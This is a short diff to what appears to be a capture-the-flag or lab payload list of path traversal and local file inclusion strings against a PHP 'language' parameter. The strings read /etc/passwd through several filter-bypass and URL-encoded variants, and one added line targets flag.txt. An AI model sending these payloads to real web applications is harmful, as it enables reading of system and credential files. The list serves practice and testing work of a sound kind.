@@ -4,6 +4,7 @@
 /index.php?language=../../../../etc/passwd
 /index.php?language=/../../../etc/passwd
 /index.php?language=./languages/../../../../etc/passwd
+/index.php?language=languages/....//....//....//....//....//....//flag.txt
 
 /index.php?language=....//....//....//....//etc/passwd
 /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
